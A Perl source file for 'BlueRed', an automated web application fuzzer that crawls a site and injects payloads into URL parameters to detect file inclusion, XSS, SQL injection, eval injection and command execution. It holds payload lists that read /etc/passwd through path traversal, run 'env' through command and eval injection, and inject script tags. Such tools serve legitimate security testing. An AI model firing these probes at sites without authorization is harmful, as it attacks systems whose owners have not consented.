#!/usr/bin/perl
#BlueRed webapp fuzzer
# by m0nad [at] email.com
#
#BlueRed is a automated web application fuzzer. 
#its based on others open-source fuzzers like :
#powerfuzzer, wapiti, cfuzz, etc...
#Bluered 'crawl' the web site and inject payloads
#to see if the applications is vulnerable.
#Its can detect :
#local and remote file inclusions, 
#cross site scripting,
#sql injections,
#eval injections,
#and command execution.
#
#Requeride Modules:
#URI
#Getopt::Long
#LWP::UserAgent
#WWW::Mechanize
#IO::Socket::SSL (for https)
#Tk
#
#Installing:
#sudo apt-get install perl-tk
#cpan -i WWW::Mechanize
#cpan -i IO::Socket::SSL
#
#Copyright (C) 2010  Victor N. Ramos Mello
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU Affero General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU Affero General Public License for more details.
#
#You should have received a copy of the GNU Affero General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
#    
#This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
#This is free software, and you are welcome to redistribute it
#under certain conditions; type `show c' for details.

use strict; use warnings; use diagnostics;	
use URI;
use LWP::UserAgent;
use WWW::Mechanize;

my $url;
my $xss;
my $cmd;
my $sql;
my $rfi;
my $lfi;
my $eval;
my %attacked = ();
my @vulns = ();
#####################
$xss = 
{
  NAME => '[XSS]',
  XPL => 
  [
    #"<script>alert('xss')</script>",
    "\"><script>alert('xss')</script>",
  ],
  BUSCA => 
  { 
     "<script>alert.'xss'.</script>" => 'XSS',
  },
};

$eval = 
{
  NAME => '[EVAL]',
  XPL => 
  [
    'system("env");',
    ';system("env");//',
  ],
  BUSCA => 
  { 
    'PATH=' => 'Eval Injection',
    'eval()\'d code'  => 'Warning Eval()',
  },
};

$cmd = 
{
  NAME => '[CMD]',
  XPL => 
  [
    '|env|',
    '|env',
    'env',
    ';env',
     '&& env',
    '`env`',
    '$(env)',

  ],
  BUSCA => 
  { 
    'PATH=' => 'Command Execution',
  },
};

$sql = 
{
  NAME => '[SQLi]',
  XPL => ["'", '-- ', '+or'],
  BUSCA => 
  { 
    'SQL syntax' => 'MySQL Injection',
    'Unclosed quotation mark after the character string'  => 'MySQL Injection',
    'not a valid MySQL result' => 'Possible MySQL Injection',
    'Error while trying to retrieve text for error' => 'Oracle SQL injection',
    'Query failed: ERROR: unterminated quoted string at or near' => 'PostgreSQL Injection',
    'Query failed: ERROR: syntax error at or near' => 'PostgreSQL Injection',
    'Unclosed quotation mark before the character string' => 'MSSQL Injection',
    'Syntax error converting the varchar value'  => 'MsAcess SQL Injection',
    'Erro de sintaxe(.*?)na expressão de consulta' => 'MsAcess SQL Injection' #pt_br error
  },
};

$rfi = 
{
  NAME => '[RFI]',
  XPL => ["http://google.com/\0"],
  BUSCA => 
  { 
    '<title>Google<\/title>' => 'Remote File Include/Read'
  },
};


$lfi = 
{
  NAME => '[LFI/LFD]',
  XPL => 
  [
"/etc/passwd\0",
'../' x 16 . "etc/passwd\0",
'../' x 16 . "boot.ini\0" ,
'..\\' x 16 . "boot.ini\0"
  ],
  BUSCA => 
  { 
'root:.' => 'Local File Incluse/Disclosure',
'boot\sloader' => 'Local File Incluse/Disclosure',
'function\.include\]:'  => 'Warning include()',
'function\.readfile\]:' => 'Warning readfile()',
#incluir mais erros

  },
};

#####################
sub attacks
{

  my $opt = shift;
  my @attks;
  
  my $flag = 1;
  if ($opt->{lfi}) {
    $flag = 0;
    push @attks, $lfi;
  } 
  if ($opt->{rfi}) {
    $flag = 0;
    push @attks, $rfi;
  } 
  if ($opt->{sql}) {
    $flag = 0;
    push @attks, $sql;
  }  
  if ($opt->{xss}) {
    $flag = 0;
    push @attks, $xss;
  }  
  if ($opt->{eval}) {
    $flag = 0;
    push @attks, $eval;
  }  
  if ($opt->{cmd}) {
    $flag = 0;
    push @attks, $cmd;
  } 
  
  if ($opt->{all} || $flag) {
    push @attks, $lfi;
    push @attks, $rfi;
    push @attks, $sql; 
    push @attks, $xss;
    push @attks, $eval;
    push @attks, $cmd;
  }
  return \@attks;
}

#####################
sub crawfuzz_recursive
{
  my $opt = shift;
  my $aref_sites = shift;
  my $seen = {};
 
  my $link = i_url (shift @{ $aref_sites });
  crawfuzz($opt, $aref_sites, $seen,  $link);
  if ($opt->{box}) {
    my $box = $opt->{box};
    $box->after(3000,[\&crawfuzz_recursive, $opt, $aref_sites]) 
  }else {
      crawfuzz_recursive($opt, $aref_sites);
  }
  
}
sub crawfuzz_loop
{
  my $opt = shift;
  my $aref_sites = shift;
  my $seen = {};

  while (my $link = i_url (shift @{ $aref_sites })) { 
     crawfuzz($opt, $aref_sites, $seen,  $link);
  }
}

sub crawfuzz
{
  my $opt = shift;
  my $aref_sites = shift;
  my $seen = shift;
  my $link = shift;
 
  
  unless($seen->{$link}++ or $link eq -1) { 

      _print ($opt, "crawling ->  $link\n") if $opt->{verbose};

      push @{ $aref_sites }, urlparser($link);

      my $aref_links = urlfuzz($opt, $link);
      push @vulns, bluered($opt, $aref_links);
  }
  
}
#####################



sub urlfuzz
{
  my $opt = shift;
  my $link = shift;
  my $aref_attacks = attacks($opt);

  my @links = ();
  foreach my $href_atk (@ { $aref_attacks }) {
    foreach my $fuzz (@ { $href_atk->{XPL} }) {
      chomp $fuzz; 
      my $new_fuzz = encode($fuzz);
      $new_fuzz = encode($new_fuzz) if $opt->{double_encode} ;

      push @links, fuzzlink($link . $new_fuzz, $href_atk); 

      my ($host, $param) = split /\?/, $link;
      next unless  $param;
      push @links, fuzzlink($host . "?" . $new_fuzz, $href_atk);
      my @parametros = split /&/, $param;
 
      my %hash = map { next unless (/=./); split /=/; } @parametros ; 
      foreach (values %hash) { 
        chomp;

        my $aux = $param;
        #$aux =~ s/$_/$new_fuzz/ ;
        $aux = str_replace ($_, $new_fuzz, $aux);
        push @links, fuzzlink($host . "?" . $aux, $href_atk);
      }
    }
  }
  return \@links;
}

sub fuzzlink
{
  my $href_fuzz = {};
  ($href_fuzz->{url}, $href_fuzz->{atk}) = @_;
  return $href_fuzz;
}


#Replace a string without using RegExp. 
#http://www.bin-co.com/perl/scripts/str_replace.php
sub str_replace 
{
  my $replace_this = shift; 
  my $with_this  = shift; 
  my $string   = shift;
	
  my $length = length($string);
  my $target = length($replace_this);
	
  for(my $i=0; $i<$length - $target + 1; $i++) {
    if(substr($string,$i,$target) eq $replace_this) {
      $string = substr($string,0,$i) . $with_this . substr($string,$i+$target);
      return $string; #Comment this if you what a global replace
    }
  }
  return $string;
}
#####################

sub bluered
{
  my $opt = shift;
  my $ref_urls = shift;
 
  my $box = $opt->{box};
  my $out =  $opt->{outfile} || '_vuln_bluered';

  my @links = @ { $ref_urls }; 
  my @vuln = ();
  
  foreach my $link (@links) {
    chomp $link;
    my $host = $link->{url} ; 
    next if $attacked{$host}++;
    my %busca = % { $link->{atk}{BUSCA} };
    my $page = getter($host);
    next unless $page;
    _print ($opt, "fuzzing -> $host\n") if $opt->{verbose};
    foreach (keys %busca) { 
      if ($page =~ m/$_/g) {
        my $result =  fmtresult($host, $busca{$_});#fix
        salva($out, $result);
        push @vuln, $result;
        _printVuln ($opt, $host, $busca{$_}); 

       # print "\a" ;
      }
    }

  }
  return @vuln;
  #return keys %seen;
}
sub _printVuln
{
  my $opt = shift;
  my $host = shift;
  my $tipo = shift;
  my $traco = '-' x 99 . "\n";
  
  _print($opt, $traco);
  _print($opt, $tipo);
  _print($opt, " :\nURL -> ");
  _print($opt, $host."\n");
  _print($opt, $traco);
  
}

sub fmtresult #fix
{
  my $host = shift;
  my $tipo = shift;
  my $traco = '-' x 99 . "\n";
  my $result =  $traco . $tipo . " :\nURL -> " . $host . "\n" . $traco;
  return $result;
}
sub salva
{
  my $out = shift;
  my $str = shift ;
  open my $FH2, '>>', $out or die "error: $!\n" ;
  print $FH2 $str;
  close $FH2 || warn "error: $!\n"  ;
}

sub _print
{
  my $opt = shift;
  my $str = shift;
  
  my $box = $opt->{box};
  print $str unless $opt->{box};
  $box->insert('end', $str ) if $opt->{box};
  
  
}

#####################
sub urlparser
{  
  my $base_url = shift ;
  my $host = host ($base_url);   
  my $mech  = WWW::Mechanize->new();
  eval { $mech->get($base_url); };
  return if ($@);
  my @links = $mech->links();
   
  my %seen = ();
  foreach my $link (@links) {  
    my $url = $link->url_abs();
    next if $url eq $base_url;
    my $hurl;
    eval { $hurl = host($url); };
    next unless $hurl;
    if ($hurl =~ $host) { 
      next if $seen{$url}++;
    }
      
  } 
  return keys %seen;
}

#####################

sub getter
{
  my $h = shift ;
  my $ua = new LWP::UserAgent;
  $ua->timeout(5);
  #$ua->UserAgent($useragent);
  my $res = $ua->get($h);
  return $res->content if $res;
}



sub i_url
{
  my $url = shift || return -1;
  $url = http($url);
  $url = $url . '/' if $url !~ '/$';
  return $url;
}

sub http
{
  my $h = shift ;
  $h = 'http://' . $h if $h !~ /^https?:/ ;
  return $h;
}

sub host 
{
  my $url = URI->new(shift);
  return $url->host() ;
}
sub encode
{
  my $str = shift ;
  return URI::Escape::uri_escape($str);
}

1;
